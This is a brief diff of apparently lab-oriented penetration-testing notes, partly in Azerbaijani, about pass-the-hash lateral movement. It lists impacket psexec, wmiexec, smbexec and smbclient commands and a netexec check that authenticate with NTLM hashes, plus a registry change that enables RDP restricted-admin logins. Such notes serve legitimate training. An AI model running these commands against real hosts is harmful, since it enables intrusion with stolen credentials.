@@ -28,6 +28,8 @@ git clone https://github.com/fortra/impacket
 impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453 ( PSEXEC )
 impacket-wmiexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453 ( WMIEXEC )
 impacket-smbexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453 ( SMBEXEC )
+impacket-smbclient DOMAIN/david@DC01 -hashes :NTLM_HASH ( SMBCLIENT )
+
 
 
 Hashed şəkildə istifadə
@@ -172,6 +174,7 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t R
 
 Test et
 netexec smb 10.129.201.126 -u julio -H 64F12CDDAA88057E06A81B54E73B949B
+
 
 
 
